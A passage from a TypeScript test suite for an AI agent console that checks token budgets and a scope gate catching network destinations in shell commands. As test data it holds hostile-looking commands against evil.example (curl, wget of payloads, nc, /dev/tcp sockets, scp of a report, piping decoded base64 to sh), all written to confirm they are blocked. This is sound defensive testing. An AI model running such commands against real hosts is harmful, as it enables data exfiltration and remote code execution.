      durationMs: 1,
      ...(usage ? { usage } : {}),
    };
  }

  it("stops with max_turn_tokens and reports used vs limit when the budget is overrun", async () => {
    // One round costs 150k tokens against a 100k-token budget.
    const runtime = new ScriptedRuntime(
      Array.from({ length: 10 }, () => toolCallWithUsage({ inputTokens: 120_000, outputTokens: 30_000 })),
    );
    const session = createConsoleSession({
      runtime,
      maxTurnTokens: 100_000,
      maxToolIterations: 50, // high ceiling — the budget must be what trips
    });

    const notices: string[] = [];
    const outcome = await session.send("audit this repo", { onNotice: (m) => notices.push(m) });

    expect(outcome.stopReason).toBe("max_turn_tokens");
    expect(outcome.toolCalls).toHaveLength(1);
    // The outcome carries the numbers the operator needs to decide.
    expect(outcome.budget.tokensUsed).toBe(150_000);
    expect(outcome.budget.tokenBudget).toBe(100_000);
    expect(outcome.budget.iterations).toBe(1);
    expect(outcome.budget.maxToolIterations).toBe(50);
    expect(outcome.usage).toEqual({ inputTokens: 120_000, outputTokens: 30_000 });
    // The notice is honest about spend, not a bare "cap reached".
    expect(notices).toHaveLength(1);
    expect(notices[0]).toContain("150000");
    expect(notices[0]).toContain("100000");
  });

  it("stops before a model call that would demonstrably overrun the budget", async () => {
    // Each round costs 400k against a 1m budget. After two rounds 800k is
    // spent; another 300k input would overrun the allowance.
    const runtime = new ScriptedRuntime(
      Array.from({ length: 10 }, () => toolCallWithUsage({ inputTokens: 300_000, outputTokens: 100_000 })),
    );
    const session = createConsoleSession({ runtime, maxTurnTokens: 1_000_000, maxToolIterations: 50 });

    const outcome = await session.send("keep going");
    expect(outcome.stopReason).toBe("max_turn_tokens");
    expect(outcome.budget.iterations).toBe(2);
    expect(outcome.budget.tokensUsed).toBe(800_000);
    expect(outcome.budget.tokensUsed).toBeLessThanOrEqual(outcome.budget.tokenBudget);
  });

  it("stops with max_tool_iterations when the backstop trips first (guards are independent)", async () => {
    // Generous budget, tiny ceiling → the runaway backstop is what stops it.
    const runtime = new ScriptedRuntime(
      Array.from({ length: 10 }, () => toolCallWithUsage({ inputTokens: 5, outputTokens: 1 })),
    );
    const session = createConsoleSession({
      runtime,
      maxTurnTokens: 1_000_000,
      maxToolIterations: 3,
    });

    const outcome = await session.send("go");
    expect(outcome.stopReason).toBe("max_tool_iterations");
    expect(outcome.budget.iterations).toBe(3);
    expect(outcome.budget.maxToolIterations).toBe(3);
    expect(outcome.budget.tokenBudget).toBe(1_000_000);
    expect(outcome.budget.tokensUsed).toBe(18); // nowhere near the budget
  });

  it("estimates missing usage and still applies the independent iteration backstop", async () => {
    // Missing usage is estimated for an explicit finite budget. With ample
    // allowance, the independent round ceiling still ends this turn.
    const runtime = new ScriptedRuntime(Array.from({ length: 20 }, () => toolCallWithUsage()));
    const session = createConsoleSession({ runtime, maxTurnTokens: 5_000_000, maxToolIterations: 4 });

    const outcome = await session.send("go");
    expect(outcome.stopReason).toBe("max_tool_iterations");
    expect(outcome.budget.tokensUsed).toBeGreaterThan(0); // Missing usage is estimated for finite budgets.
    expect(outcome.budget.iterations).toBe(4);
  });

  it("honours an explicit maxToolIterations exactly and never overrides it with the new default", async () => {
    const runtime = new ScriptedRuntime(
      Array.from({ length: 30 }, () => toolCallWithUsage({ inputTokens: 1, outputTokens: 1 })),
    );
    const session = createConsoleSession({ runtime, maxToolIterations: 7 });

    const outcome = await session.send("go");
    expect(outcome.stopReason).toBe("max_tool_iterations");
    // Exactly 7 rounds — not the raised default, not a clamped value.
    expect(outcome.toolCalls).toHaveLength(7);
    expect(outcome.budget.iterations).toBe(7);
    expect(outcome.budget.maxToolIterations).toBe(7);
  });

  it("completes normally with end_turn when well inside both guards", async () => {
    const runtime = new ScriptedRuntime([
      toolCallWithUsage({ inputTokens: 40, outputTokens: 10 }),
      { ...endTurn("All done — nothing else to check."), usage: { inputTokens: 60, outputTokens: 20 } },
    ]);
    const session = createConsoleSession({ runtime, maxTurnTokens: 100_000, maxToolIterations: 50 });

    const notices: string[] = [];
    const outcome = await session.send("quick question", { onNotice: (m) => notices.push(m) });

    expect(outcome.stopReason).toBe("end_turn");
    expect(notices).toHaveLength(0);
    // The budget block is present on the happy path too, so a surface can show
    // consumption on every turn rather than only on a stop.
    expect(outcome.budget.tokensUsed).toBe(130);
    expect(outcome.budget.tokenBudget).toBe(100_000);
    expect(outcome.budget.iterations).toBe(1);
  });

  it("keeps the default unlimited beyond 2m cumulative tokens in one turn", async () => {
    // Thirty rounds cross the old 2m cumulative cap while each prompt fits
    // independently. The unlimited default must reach a natural end.
    const perRound = { inputTokens: 100_000, outputTokens: 0 }; // 30 * 100k = 3m
    const runtime = new ScriptedRuntime([
      ...Array.from({ length: 30 }, () => toolCallWithUsage(perRound)),
      endTurn("Audit complete."),
    ]);
    const session = createConsoleSession({ runtime }); // no explicit limits

    const outcome = await session.send("audit this repo");
    expect(outcome.stopReason).toBe("end_turn");
    expect(outcome.toolCalls).toHaveLength(30);
    expect(outcome.budget.tokensUsed).toBe(3_000_000);
  });

  it("fires onUsage per model call, not only at turn end, with running totals against the budget", async () => {
    const runtime = new ScriptedRuntime([
      toolCallWithUsage({ inputTokens: 10, outputTokens: 2 }),
      toolCallWithUsage({ inputTokens: 20, outputTokens: 3 }),
      { ...endTurn("done"), usage: { inputTokens: 30, outputTokens: 5 } },
    ]);
    const session = createConsoleSession({ runtime, maxTurnTokens: 100_000, maxToolIterations: 50 });

    const samples: ConsoleUsageReport[] = [];
    const outcome = await session.send("go", { onUsage: (u) => samples.push(u) });

    // One sample per model call — a UI can watch the number climb mid-turn.
    expect(samples).toHaveLength(3);
    expect(samples.map((sample) => sample.kind)).toEqual(["planner", "planner", "planner"]);
    // Per-call deltas.
    expect(samples.map((s) => s.inputTokens)).toEqual([10, 20, 30]);
    // Running turn totals, monotonically increasing, measured against the budget.
    expect(samples.map((s) => s.turnTokensUsed)).toEqual([12, 35, 70]);
    expect(samples.every((s) => s.turnTokenBudget === 100_000)).toBe(true);
    // Rounds COMPLETED at the time of each sample.
    expect(samples.map((s) => s.iterations)).toEqual([0, 1, 2]);
    expect(samples[samples.length - 1].turnTokensUsed).toBe(outcome.budget.tokensUsed);
  });

  it("preserves cache token categories in per-call pricing reports without adding them to token totals twice", async () => {
    const reported = { inputTokens: 1000, outputTokens: 100, cachedInputTokens: 800, cacheWriteTokens: 100 };
    const samples: ConsoleUsageReport[] = [];
    const session = createConsoleSession({ runtime: new ScriptedRuntime([{ ...endTurn("done"), usage: reported }]) });
    const outcome = await session.send("go", { onUsage: sample => samples.push(sample) });
    expect(samples).toHaveLength(1);
    expect(samples[0]).toMatchObject(reported);
    expect(samples[0].turnTokensUsed).toBe(1100);
    expect(outcome.budget.tokensUsed).toBe(1100);
    // The gateway prices this exact callback. Cache reads/writes are included
    // in prompt tokens, and must not silently be charged at full input rates.
    expect(estimateCost(samples[0], "gpt-5.6-sol")).toBeCloseTo(0.004525, 10);
    expect(estimateCost(samples[0], "gpt-5.6-sol")).toBeLessThan(estimateCost({ inputTokens: 1000, outputTokens: 100 }, "gpt-5.6-sol"));
  });

  it("counts usage a runtime reports only through the stream callback, without double-counting", async () => {
    // Some provider wires surface usage on the return value, some only through
    // `callbacks.onUsage`. Both must land in the budget exactly once.
    class CallbackOnlyUsageRuntime implements NativeRuntime {
      readonly type = "api" as const;
      turn = 0;
      async isAvailable(): Promise<boolean> {
        return true;
      }
      async executeNative(
        _system: string,
        _messages: NativeMessage[],
        _tools: NativeToolDef[],
        callbacks?: NativeStreamCallbacks,
      ): Promise<NativeRuntimeResult> {
        // Usage arrives ONLY via the callback — never on the result.
        callbacks?.onUsage?.({ inputTokens: 100, outputTokens: 10, cachedInputTokens: 75, cacheWriteTokens: 5 });
        this.turn += 1;
        if (this.turn === 1) {
          return {
            content: [{ type: "tool_use", id: "c1", name: "load_skill", input: {} }],
            stopReason: "tool_use",
            durationMs: 1,
          };
        }
        return endTurn("done");
      }
    }

    const samples: ConsoleUsageReport[] = [];
    const session = createConsoleSession({ runtime: new CallbackOnlyUsageRuntime() });
    const outcome = await session.send("go", { onUsage: (u) => samples.push(u) });

    expect(outcome.stopReason).toBe("end_turn");
    // Two calls at 110 each, counted once apiece — not 440 from double-counting.
    expect(outcome.budget.tokensUsed).toBe(220);
    expect(outcome.usage).toEqual({ inputTokens: 200, outputTokens: 20 });
    // And the engine emitted exactly one authoritative sample per model call.
    expect(samples).toHaveLength(2);
    expect(samples.map(sample => [sample.cachedInputTokens, sample.cacheWriteTokens])).toEqual([[75, 5], [75, 5]]);
  });

  it("resumes cleanly from the existing history after a budget stop, re-running nothing", async () => {
    // Turn 1 is cut off by the budget mid-investigation. Turn 2 must continue
    // from the SAME conversation: the model sees the prior tool results, no
    // tool is dispatched again, and nothing auto-continued in between.
    const runtime = new ScriptedRuntime([
      toolCallWithUsage({ inputTokens: 40_000, outputTokens: 360_000 }), // turn 1: spends the budget
      { ...endTurn("Continuing: here is the summary."), usage: { inputTokens: 50, outputTokens: 10 } }, // turn 2
    ]);
    const session = createConsoleSession({ runtime, maxTurnTokens: 300_000, maxToolIterations: 50 });

    const first = await session.send("audit this repo");
    expect(first.stopReason).toBe("max_turn_tokens");
    expect(first.toolCalls).toHaveLength(1);

    // History is well-formed at the stop: the assistant's tool_use has its
    // matching tool_result, so the conversation is resumable as-is.
    const toolUseIds = session.messages.flatMap((m) =>
      m.content.flatMap((b) => (b.type === "tool_use" ? [b.id] : [])),
    );
    const toolResultIds = session.messages.flatMap((m) =>
      m.content.flatMap((b) => (b.type === "tool_result" ? [b.tool_use_id] : [])),
    );
    expect(toolUseIds).toEqual(toolResultIds);
    const messagesAfterFirst = session.messages.length;

    // The operator decides to continue — a plain message, no special API.
    const second = await session.send("continue");

    expect(second.stopReason).toBe("end_turn");
    // No tool was re-dispatched on the resumed turn.
    expect(second.toolCalls).toHaveLength(0);
    // The resumed turn was sent the FULL prior history, tool results included.
    const resumedMessages = runtime.calls[runtime.calls.length - 1].messages;
    expect(resumedMessages.length).toBe(messagesAfterFirst + 1);
    expect(
      resumedMessages.some((m) => m.content.some((b) => b.type === "tool_result")),
    ).toBe(true);
    // History only grew; the earlier turn was not replayed or rewritten.
    expect(session.messages.length).toBeGreaterThan(messagesAfterFirst);
    // Budget accounting is per-turn: the fresh turn starts from zero.
    expect(second.budget.tokensUsed).toBe(60);
    expect(second.budget.iterations).toBe(0);
  });
});

describe("monotonic guard floor", () => {
  it("denies a tool this build does not recognize instead of running it", async () => {
    // The gates are keyed on tool-NAME membership in static maps, so a name in
    // none of them is the least-dangerous class by omission. The guard floor is
    // what turns that silent trust into a refusal.
    const runtime = new ScriptedRuntime([
      {
        content: [{ type: "tool_use", id: "g1", name: "acme_exfil", input: {} }],
        stopReason: "tool_use",
        durationMs: 1,
      },
      endTurn("done"),
    ]);
    const session = createConsoleSession({ runtime, autonomyMode: "yolo" });

    const outcome = await session.send("run it");

    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain("unresolved capability flags");
  });

  it("still dispatches a recognized tool through the same path", async () => {
    // The floor must be inert for known tools, or it is just an outage.
    const runtime = new ScriptedRuntime([
      {
        content: [{ type: "tool_use", id: "g2", name: "bash", input: { command: "echo ok" } }],
        stopReason: "tool_use",
        durationMs: 1,
      },
      endTurn("done"),
    ]);
    const session = createConsoleSession({ runtime, autonomyMode: "yolo" });

    const outcome = await session.send("run it");

    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.error ?? "").not.toContain("unresolved capability");
  });

  it("does not deny a known effectful tool in copilot with no approval channel (no approval requirement)", async () => {
    // Under the current model copilot has NO per-action approval, so an absent
    // approveTool is not a fail-open corner — there is nothing to approve. A
    // recognized effectful tool with no network reach runs. (The obsolete
    // guardApprovalUnavailable, which used to refuse this, is intentionally not
    // wired — see WIRED_GUARDS.)
    const runtime = new ScriptedRuntime([
      {
        content: [{ type: "tool_use", id: "g3", name: "bash", input: { command: "echo ok" } }],
        stopReason: "tool_use",
        durationMs: 1,
      },
      endTurn("done"),
    ]);
    const session = createConsoleSession({ runtime, autonomyMode: "copilot" });

    const outcome = await session.send("run it");

    expect(outcome.toolCalls[0].result.success).toBe(true);
    expect(outcome.toolCalls[0].result.error ?? "").not.toContain("approval mechanism");
  });
});

// ── Schemeless shell-target extraction + the unresolved-destination gate ──
//
// The scope gate used to collect targets with a single `https?://` regex over
// the tool arguments. Everything a shell can do without a scheme — a bare host
// argument to curl/wget/nc, an IP literal, bash's `/dev/tcp` socket — produced
// ZERO extracted URLs, and zero extracted URLs meant "approved". These tests
// pin both halves of the fix: the schemeless forms are now seen, and a
// network-reaching command whose destination cannot be read is escalated
// instead of approved.

describe("Console scope gate — schemeless shell destinations", () => {
  /** A single `bash` turn carrying `command`, then a stop. */
  function bashTurn(id: string, command: string): NativeRuntimeResult {
    return {
      content: [{ type: "tool_use", id, name: "bash", input: { command } }],
      stopReason: "tool_use",
      durationMs: 1,
    };
  }

  /**
   * Run one shell command through a fresh standard-mode session whose operator
   * declines every scope request. Returns the recorded requests plus the tool
   * result, so a test can assert BOTH what was extracted and that the call was
   * actually blocked. A fresh session per case matters: denied-host memory
   * would otherwise suppress the prompt for the second case onward.
   */
  async function probeCommand(command: string): Promise<{
    requests: ConsoleScopeRequest[];
    outcome: Awaited<ReturnType<ReturnType<typeof createConsoleSession>["send"]>>;
  }> {
    const runtime = new ScriptedRuntime([bashTurn("c1", command), endTurn("done")]);
    const requests: ConsoleScopeRequest[] = [];
    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      requestScope: async (req) => {
        requests.push(req);
        return null; // decline, so the tool is never actually dispatched
      },
    });
    const outcome = await session.send("go");
    return { requests, outcome };
  }

  /** Every case the old extractor missed, plus the one it already caught. */
  const cases: Array<{ command: string; host: string; port?: string }> = [
    { command: "curl https://evil.example/x", host: "evil.example" },
    { command: "curl evil.example/x", host: "evil.example" },
    { command: "curl -sS evil.example", host: "evil.example" },
    { command: "wget evil.example/payload", host: "evil.example" },
    { command: "nc evil.example 443", host: "evil.example", port: "443" },
    { command: "curl 203.0.113.7/x", host: "203.0.113.7" },
    { command: "bash -c 'exec 3<>/dev/tcp/evil.example/443'", host: "evil.example", port: "443" },
  ];

  for (const testCase of cases) {
    it(`extracts and gates: ${testCase.command}`, async () => {
      const { requests, outcome } = await probeCommand(testCase.command);

      // The operator was asked — the call did not sail through on "no URL found".
      expect(requests).toHaveLength(1);
      const hosts = requests[0].requestedUrls.map((u) => new URL(u).hostname);
      expect(hosts).toContain(testCase.host);
      if (testCase.port) {
        // Asserted on the raw normalized string: `new URL(...).port` is "" for a
        // scheme-default port, which would hide a correctly recovered `:443`.
        expect(requests[0].requestedUrls.some((u) => u.includes(`:${testCase.port}`))).toBe(true);
      }
      // And declining actually blocked it.
      expect(outcome.toolCalls).toHaveLength(1);
      expect(outcome.toolCalls[0].result.success).toBe(false);
      expect(outcome.toolCalls[0].result.error).toContain("denied");
    });
  }

  it("sees more exotic clients too (ssh, telnet, dig, openssl s_client, ping)", async () => {
    for (const command of [
      "ssh operator@evil.example",
      "telnet evil.example 23",
      "dig evil.example",
      "openssl s_client -connect evil.example:443",
      "ping -c 1 evil.example",
      "scp report.txt operator@evil.example:/tmp/",
    ]) {
      const { requests } = await probeCommand(command);
      expect(
        requests.flatMap((r) => r.requestedUrls).map((u) => new URL(u).hostname),
        `command: ${command}`,
      ).toContain("evil.example");
    }
  });

  it("finds a destination hidden inside a quoted sub-shell", async () => {
    const { requests } = await probeCommand(`sh -c 'wget evil.example/stage2'`);
    expect(requests[0].requestedUrls.map((u) => new URL(u).hostname)).toContain("evil.example");
  });
});

describe("Console scope gate — the false-positive line", () => {
  function bashTurn(id: string, command: string): NativeRuntimeResult {
    return {
      content: [{ type: "tool_use", id, name: "bash", input: { command } }],
      stopReason: "tool_use",
      durationMs: 1,
    };
  }

  it("does not prompt or deny `bash echo hello`, even with a session target set", async () => {
    // The old fallback substituted the SESSION TARGET whenever no URL was
    // found, so a purely local command was validated against a host it was
    // never going to contact — and prompted when that host was unscoped. Both
    // the bogus validation and the bogus prompt are gone.
    const runtime = new ScriptedRuntime([bashTurn("c1", "echo hello"), endTurn("done")]);
    let prompts = 0;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      target: "https://engagement.test",
      requestScope: async () => {
        prompts += 1;
        return null;
      },
      // Standard puts effectful actions to the operator; approve so the focus of
      // this test stays on the SCOPE gate (which must not fire for a local echo).
      approveTool: async () => true,
    });

    const outcome = await session.send("say hello");
    expect(prompts).toBe(0);
    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.success).toBe(true);
  });

  it("leaves ordinary local shell work alone (no client, no IP, no opaque exec)", async () => {
    for (const command of [
      "echo hello",
      "ls -la /tmp",
      "grep -rn TODO src/",
      "cat package.json",
      "git status --short",
    ]) {
      const runtime = new ScriptedRuntime([bashTurn("c1", command), endTurn("done")]);
      let prompts = 0;
      const session = createConsoleSession({
        runtime,
        // Standard's per-action approval denies before dispatch, so nothing is
        // actually executed; the assertion of interest is that the SCOPE gate
        // never fired for a purely local command.
        autonomyMode: "standard",
        target: "https://engagement.test",
        requestScope: async () => {
          prompts += 1;
          return null;
        },
        approveTool: async () => false,
      });
      const outcome = await session.send("work");
      expect(prompts, `command: ${command}`).toBe(0);
      expect(outcome.toolCalls[0].result.error, `command: ${command}`).toContain("not approved");
    }
  });

  it("leaves a structured non-shell tool with no URL untouched (str_replace)", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "str_replace", input: { path: "/etc/hostname", old_string: "a", new_string: "b" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("done"),
    ]);
    let prompts = 0;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      target: "https://engagement.test",
      requestScope: async () => {
        prompts += 1;
        return null;
      },
    });

    const outcome = await session.send("read it");
    expect(prompts).toBe(0);
    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.error ?? "").not.toContain("Scope request");
  });
});

describe("Console scope gate — schemeless hosts against a real scope", () => {
  function bashTurn(id: string, command: string): NativeRuntimeResult {
    return {
      content: [{ type: "tool_use", id, name: "bash", input: { command } }],
      stopReason: "tool_use",
      durationMs: 1,
    };
  }

  it("allows a schemeless host that the engagement scope covers", async () => {
    const runtime = new ScriptedRuntime([bashTurn("c1", "curl -sS allowed.test/health"), endTurn("done")]);
    let prompts = 0;
    const session = createConsoleSession({
      runtime,
      // Standard with a denying approveTool: the per-action gate stops the
      // command from actually reaching the network, so passing the SCOPE gate is
      // observable as "no scope prompt, denied by approval instead".
      autonomyMode: "standard",
      scope: ScopePolicy.fromJson({ in_scope: ["allowed.test"] }),
      requestScope: async () => {
        prompts += 1;
        return null;
      },
      approveTool: async () => false,
    });

    const outcome = await session.send("check health");
    expect(prompts).toBe(0); // in scope → the scope gate approved silently
    expect(outcome.toolCalls[0].result.error).toContain("not approved");
  });

  it("prompts for a schemeless host the engagement scope does not cover", async () => {
    const runtime = new ScriptedRuntime([bashTurn("c1", "curl -sS elsewhere.test/health"), endTurn("done")]);
    const requests: ConsoleScopeRequest[] = [];
    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      scope: ScopePolicy.fromJson({ in_scope: ["allowed.test"] }),
      requestScope: async (req) => {
        requests.push(req);
        return null;
      },
    });

    const outcome = await session.send("check elsewhere");
    expect(requests).toHaveLength(1);
    expect(requests[0].requestedUrls.map((u) => new URL(u).hostname)).toContain("elsewhere.test");
    expect(outcome.toolCalls[0].result.success).toBe(false);
  });

  it("refuses an out-of-scope schemeless host in Auto without prompting", async () => {
    const runtime = new ScriptedRuntime([bashTurn("c1", "curl elsewhere.test/x"), endTurn("done")]);
    let prompts = 0;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "yolo",
      scope: ScopePolicy.fromJson({ in_scope: ["allowed.test"] }),
      requestScope: async () => {
        prompts += 1;
        return null;
      },
    });

    const outcome = await session.send("go");
    expect(prompts).toBe(0);
    expect(outcome.toolCalls[0].result.success).toBe(false);
  });

  it("applies denied-host memory to a newly extracted schemeless host", async () => {
    // The declined host is only visible through the new extraction path — the
    // old regex would have produced no URL at all, so there would have been
    // nothing to remember.
    const runtime = new ScriptedRuntime([
      bashTurn("c1", "curl memory.test/a"),
      endTurn("declined"),
      bashTurn("c2", "wget memory.test/b"),
      endTurn("auto-denied"),
    ]);
    let prompts = 0;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      requestScope: async () => {
        prompts += 1;
        return null;
      },
    });

    await session.send("hit memory.test");
    const second = await session.send("hit memory.test again");
    expect(prompts).toBe(1);
    expect(second.toolCalls[0].result.error).toContain("already declined");
  });
});

describe("Console scope gate — unresolvable shell destinations", () => {
  function bashTurn(id: string, command: string): NativeRuntimeResult {
    return {
      content: [{ type: "tool_use", id, name: "bash", input: { command } }],
      stopReason: "tool_use",
      durationMs: 1,
    };
  }

  const opaque = [
    `curl "$TARGET"`,
    "curl $(cat /tmp/host)",
    "echo aGVsbG8= | base64 -d | sh",
    "eval $PAYLOAD",
  ];

  it("escalates an unreadable network destination to the operator in standard mode", async () => {
    for (const command of opaque) {
      const runtime = new ScriptedRuntime([bashTurn("c1", command), endTurn("done")]);
      const requests: ConsoleScopeRequest[] = [];
      const session = createConsoleSession({
        runtime,
        autonomyMode: "standard",
        requestScope: async (req) => {
          requests.push(req);
          return null;
        },
      });

      const outcome = await session.send("go");
      // The operator is asked — and the request carries the actual call, so the
      // surface can show the command even though there is no URL to show.
      expect(requests, `command: ${command}`).toHaveLength(1);
      expect(requests[0].unresolvedTargets ?? [], `command: ${command}`).not.toHaveLength(0);
      expect(requests[0].call.arguments).toEqual({ command });
      expect(outcome.toolCalls[0].result.success, `command: ${command}`).toBe(false);
    }
  });

  it("RUNS an unreadable local command in yolo without prompting (operator opted into full autonomy)", async () => {
    // `base64 --decode` is flagged unresolvable by the shell scanner (it hides
    // its payload), but it is a LOCAL command with no network reach. Auto is the
    // operator's explicit full-autonomy opt-in, so the scope gate no longer
    // refuses an unreadable command — it runs (the executor's SSRF rail still
    // applies to supported network tools). Named foreign hosts need approval.
    const prevRequireScope = process.env["ZERO_REQUIRE_SCOPE"];
    delete process.env["ZERO_REQUIRE_SCOPE"];
    try {
      const runtime = new ScriptedRuntime([bashTurn("c1", `echo aGk= | base64 -d`), endTurn("done")]);
      let prompts = 0;
      const session = createConsoleSession({
        runtime,
        autonomyMode: "yolo",
        scope: ScopePolicy.fromJson({ in_scope: ["allowed.test"] }),
        requestScope: async () => {
          prompts += 1;
          return null;
        },
      });

      const outcome = await session.send("go");
      expect(prompts).toBe(0);
      expect(outcome.toolCalls[0].result.success).toBe(true);
      expect(outcome.toolCalls[0].result.error ?? "").not.toContain("cannot resolve");
      expect(outcome.toolCalls[0].result.error ?? "").not.toContain("Auto mode");
    } finally {
      if (prevRequireScope !== undefined) process.env["ZERO_REQUIRE_SCOPE"] = prevRequireScope;
    }
  });

  it("remembers a declined opaque command instead of re-prompting for it", async () => {
    const runtime = new ScriptedRuntime([
      bashTurn("c1", `curl "$TARGET"`),
      endTurn("declined"),
      bashTurn("c2", `curl "$TARGET"`),
      endTurn("auto-denied"),
    ]);
    let prompts = 0;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      requestScope: async () => {
        prompts += 1;
        return null;
      },
    });

    await session.send("go");
    const second = await session.send("go again");
    expect(prompts).toBe(1);
    expect(second.toolCalls[0].result.error).toContain("already declined");
  });

  it("still falls through to the executor when no requestScope callback is wired", async () => {
    // The SCOPE gate must not turn "no requestScope callback" into a denial —
    // the executor's own validation governs. (An approveTool IS supplied so the
    // standard-mode per-action approval floor is satisfied; the point here is
    // purely that the absent SCOPE callback does not itself block the call.)
    const runtime = new ScriptedRuntime([bashTurn("c1", "echo ok"), endTurn("done")]);
    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      approveTool: async () => true,
    });
    const outcome = await session.send("go");
    expect(outcome.toolCalls[0].result.success).toBe(true);
  });
});

describe("Console operator target selection", () => {
  const sessions: ReturnType<typeof createConsoleSession>[] = [];
  afterEach(async () => {
    for (const session of sessions.splice(0)) await session.cleanup();
  });

  function openSession(runtime: NativeRuntime, options: Partial<Parameters<typeof createConsoleSession>[0]> = {}) {
    const session = createConsoleSession({
      runtime, autonomyMode: "yolo", refineObjective: false, ...options,
    });
    sessions.push(session);
    return session;
  }

  function profileAndProbe(url: string): NativeRuntimeResult {
    return {
      content: [
        { type: "tool_use", id: "profile", name: "load_skill", input: {} },
        // Exercise the real shared network authorization gate without contacting
        // an external server: bash prints the URL instead of fetching it.
        { type: "tool_use", id: "probe", name: "bash", input: { command: `printf '%s' ${JSON.stringify(url)}` } },
      ],
      stopReason: "tool_use", durationMs: 1,
    };
  }

  it("adopts a bare operator target and changes anchors without discarding the conversation", async () => {
    const runtime = new ScriptedRuntime([
      endTurn("Welcome"), profileAndProbe("https://doruk.ch/"), endTurn("Ready"),
      profileAndProbe("https://api.next.test/"), endTurn("Changed"),
    ]);
    const session = openSession(runtime);
    await session.send("hello");
    const messages = session.messages;
    const first = await session.send("doruk.ch");
    expect(first.toolCalls.map(({ result }) => result.success)).toEqual([true, true]);
    expect(JSON.stringify(first.toolCalls[1].result.output)).toContain("https://doruk.ch/");
    expect(session.target).toBe("https://doruk.ch/");
    expect(session.scope).toBeUndefined();
    expect(runtime.calls[1].system).toContain("Current target: https://doruk.ch/");

    const second = await session.send("https://next.test/");
    expect(second.toolCalls[1].result.success).toBe(true);
    expect(session.target).toBe("https://next.test/");
    expect(session.scope).toBeUndefined();
    expect(session.messages).toBe(messages);
    expect(runtime.calls[3].messages[0].content).toEqual([{ type: "text", text: "hello" }]);
    expect(runtime.calls[3].system).toContain("Current target: https://next.test/");
  });

  it("keeps explicit restrictions across target and mode changes while ignoring derived grants", async () => {
    const scope = ScopePolicy.fromJson({ in_scope: ["first.test", "second.test"], out_of_scope: ["excluded.test"] });
    const runtime = new ScriptedRuntime([
      endTurn("First"), endTurn("Second"),
      profileAndProbe("https://outside.test/"), endTurn("Restricted"),
    ]);
    const session = openSession(runtime, { scope });
    await session.send("first.test");
    await session.send("second.test");
    session.setApprovals("ask");
    session.setApprovals("auto");
    expect(session.scope).toBe(scope);
    expect(session.target).toBe("https://second.test/");
    expect((await session.send("Inspect outside endpoint")).toolCalls[1].result.success).toBe(false);
    expect(session.scope).toBe(scope);
  });

  it("does not let discovered endpoints overwrite explicit restrictions", async () => {
    const runtime = new ScriptedRuntime([profileAndProbe("https://unrelated.test/"), endTurn("Discovered")]);
    const session = openSession(runtime, { scope: ScopePolicy.fromJson({ in_scope: ["doruk.ch"] }) });
    const outcome = await session.send("doruk.ch");
    expect(outcome.toolCalls[0].result.success).toBe(true);
    expect(outcome.toolCalls[1].result.success).toBe(false);
    expect(session.target).toBe("https://doruk.ch/");
    expect(session.scope?.match("https://unrelated.test/").allowed).toBe(false);
  });

  it("does not derive authority from quoted prose, imported history, or model text", async () => {
    const runtime = new ScriptedRuntime([
      profileAndProbe("https://outside.test/"), endTurn("https://outside.test/"),
      profileAndProbe("https://outside.test/"), endTurn("No authorization"),
    ]);
    const session = openSession(runtime, {
      initialMessages: [{ role: "user", content: [{ type: "text", text: "outside.test" }] }],
      scope: ScopePolicy.fromJson({}),
    });
    const prose = await session.send('Explain this link: "https://outside.test/"');
    const quoted = await session.send('"https://outside.test/"');
    expect(prose.toolCalls[1].result.success).toBe(false);
    expect(quoted.toolCalls[1].result.success).toBe(false);
    expect(session.target).toBe("");
    expect(session.scope?.match("https://outside.test/").allowed).toBe(false);
  });

  it("preserves explicit exclusions when the operator selects an excluded target", async () => {
    const scope = ScopePolicy.fromJson({ in_scope: ["current.test"], out_of_scope: ["excluded.test"] });
    const session = openSession(new ScriptedRuntime([profileAndProbe("https://excluded.test/"), endTurn("Denied")]), {
      target: "https://current.test/", scope,
    });
    const outcome = await session.send("excluded.test");
    expect(outcome.toolCalls[1].result.success).toBe(false);
    expect(session.target).toBe("https://current.test/");
    expect(session.scope).toBe(scope);
    expect(session.scope?.match("https://excluded.test/").allowed).toBe(false);
  });

  it("asks again only for fresh explicit operator selection and preserves a repeated refusal", async () => {
    let prompts = 0;
    const session = openSession(new ScriptedRuntime([
      profileAndProbe("https://declined.test/"), endTurn("Denied"),
      profileAndProbe("https://declined.test/"), endTurn("Still denied"),
    ]), {
      autonomyMode: "standard", approveTool: async () => true,
      requestScope: async () => { prompts++; return null; },
    });
    await session.send("Inspect the requested endpoint");
    session.setApprovals("auto");
    const outcome = await session.send("declined.test");
    expect(outcome.toolCalls[1].result.error).toContain("already declined");
    expect(prompts).toBe(2);
    expect(session.target).toBe("");
    expect(session.scope).toBeUndefined();
  });

  it("recovers a denied host only after confirmation without replacing history or custom instructions", async () => {
    const runtime = new ScriptedRuntime([
      profileAndProbe("https://declined.test/"), endTurn("Denied"),
      profileAndProbe("https://declined.test/"), endTurn("Retry denied"),
      profileAndProbe("https://declined.test/"), endTurn("Approved"),
    ]);
    let prompts = 0;
    const scope = ScopePolicy.fromJson({ in_scope: ["current.test"], out_of_scope: ["excluded.test"] });
    const session = openSession(runtime, {
      autonomyMode: "standard", approveTool: async () => true,
      target: "https://current.test/", scope, systemPrompt: "Keep my custom instructions",
      requestScope: async request => {
        prompts++;
        if (prompts === 1) return null;
        expect(request.requestedUrls).toEqual(["https://declined.test/"]);
        expect(session.target).toBe("https://current.test/");
        expect(session.scope).toBe(scope);
        expect(runtime.calls).toHaveLength(4);
